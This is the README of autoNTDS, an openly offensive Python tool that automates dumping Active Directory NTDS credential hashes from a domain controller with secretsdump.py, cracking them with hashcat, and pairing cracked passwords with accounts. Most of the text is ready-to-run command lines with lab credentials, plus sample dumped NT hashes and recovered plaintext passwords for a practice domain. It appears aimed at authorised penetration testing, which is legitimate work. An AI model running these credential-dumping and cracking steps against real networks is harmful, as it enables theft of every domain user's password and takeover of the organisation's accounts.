# autoNTDS
autoNTDS is a Python utility that facilitates the extraction of NTDS dumps, cracks the hashes using hashcat, and post-processes the results to match users with their cracked passwords. This tool is designed to streamline the process of handling NTDS hashes.

## Features
- **NTDS Dumping**: Automated execution of secretsdump.py for organized NTDS extraction, automatically removing unnecessary accounts, such as computer and guest accounts, and dumping them into relevant txt files. 
- **Automated Hash Cracking**: Leverage hashcat for cracking the extracted NTDS hashes.
- **Post-processing**: Match cracked passwords with their respective users.

## Installation
### Prerequisites
1. Ensure you have Python 3.x installed.
2. Ensure you have both secretsdump.py (from Impacket) and hashcat installed and available in your system's PATH.
3. Proper permissions to execute NTDS hash dumps against the target system.

### Steps
1. Clone this repository:
```
git clone https://github.com/hmaverickadams/autoNTDS.git
cd autoNTDS
```

## Usage
### Running the tool:
`python autoNTDS.py --help`

### Options:
```
usage: autoNTDS.py [-h] [--ntds] [--crack] [-d DOMAIN] [-u USER] [-p PASSWORD] [-ip IPADDRESS] [-w WORDLIST] [-r RULES] [-O]
                   [--passwords-to-users USERS_AND_HASHES CRACKED]

Execute secretsdump.py and hashcat with provided parameters.

options:
  -h, --help            show this help message and exit
  --ntds                Dump the NTDS
  --crack               Crack the hashes using hashcat
  -d DOMAIN, --domain DOMAIN
                        Domain name
  -u USER, --user USER  Username
  -p PASSWORD, --password PASSWORD
                        Password
  -ip IPADDRESS, --ipaddress IPADDRESS
                        IP address
  -w WORDLIST, --wordlist WORDLIST
                        Wordlist for hashcat
  -r RULES, --rules RULES
                        Hashcat rules
  -O, --optimized       Run Hashcat in optimized mode
  --passwords-to-users USERS_AND_HASHES CRACKED
                        Match users with their cracked passwords. Use this option if you cracked the hashes elsewhere.

Usage examples:
  autoNTDS.py --ntds -d domain -u username -p password -ip 192.168.1.1
  autoNTDS.py --ntds --crack -d domain -u username -p password -ip 192.168.1.1 -w wordlist.txt
  autoNTDS.py --passwords-to-users users_and_hashes.txt cracked.txt
```

### Basic Usage - Dumping the NTDS:
`python autoNTDS.py --ntds -d MARVEL.local -u hawkeye -p Password2@ -ip 192.168.138.136`

The above will dump the NTDS of the MARVEL.local DC and create two files:

- MARVEL.local-users-and-hashes.txt
- MARVEL.local-nt-hashes.txt

Here is an example output of those files.

**MARVEL.local-users-and-hashes.txt**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:d03b572b319e335ecd3e793412a28524:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
hawkeye:1114:aad3b435b51404eeaad3b435b51404ee:7a829d816a477655abe98a8c7de84c99:::
```

**MARVEL.local-nt-hashes.txt**

```
920ae267e048417fcfe00f49ecbd4b33
d03b572b319e335ecd3e793412a28524
f4ab68f27303bcb4024650d8fc5f973a
64f12cddaa88057e06a81b54e73b949b
c39f2beb3d2ec06a62cb887fb391dee0
7a829d816a477655abe98a8c7de84c99
```

### Basic Usage - Automated Cracking:
`python autoNTDS.py --ntds -d MARVEL.local -u hawkeye -p Password2@ -ip 192.168.138.136 --crack -w /usr/share/wordlists/rockyou.txt`

The above will dump the NTDS of the MARVEL.local DC, create two files mentioned previously, and attempt to automatically crack the dumped NTDS with the supplied wordlist.

If cracked hashes are found, they are automatically tied back to their user account in a text file.  For example, here is the output of the **MARVEL.local-cracked-users.txt** file:

```
Administrator:P@$$w0rd!
MARVEL.local\SQLService:MYpassword123#
MARVEL.local\fcastle:Password1
MARVEL.local\pparker:Password2
hawkeye:Password2@
```

You can also use rulesets and optimize Hashcat, for example:

`python autoNTDS.py --ntds -d MARVEL.local -u hawkeye -p Password1@ -ip 192.168.138.136 --crack -w /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule -O`

The above will dump the NTDS of the MARVEL.local DC and attempt to crack the relevant hashes using the provided rockyou.txt wordlist and the OneRule ruleset while optimizing Hashcat.

### Basic Usage - Matching Users with their Cracked Passwords:
If you choose to run password cracking elsewhere, you can still easily match the passwords back to the user.

`python autoNTDS.py --passwords-to-users MARVEL.local-users-and-hashes.txt cracked.txt`

Where **MARVEL.local-users-and-hashes.txt** looks as such:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:d03b572b319e335ecd3e793412a28524:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
hawkeye:1114:aad3b435b51404eeaad3b435b51404ee:7a829d816a477655abe98a8c7de84c99:::
```

Where **cracked.txt** looks as such:

```
920ae267e048417fcfe00f49ecbd4b33:P@$$w0rd!
f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
64f12cddaa88057e06a81b54e73b949b:Password1
c39f2beb3d2ec06a62cb887fb391dee0:Password2
7a829d816a477655abe98a8c7de84c99:Password2@
```

The final output will result in **cracked-users.txt**, which will look like this:

```
Administrator:P@$$w0rd!
MARVEL.local\SQLService:MYpassword123#
MARVEL.local\fcastle:Password1
MARVEL.local\pparker:Password2
hawkeye:Password2@
```

## Contributions
Contributions are always welcome! Please open an issue or submit a pull request.

## Copyright
autoNTDS by Heath Adams Copyright (C) 2023 TCM Security, Inc.

This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/
 
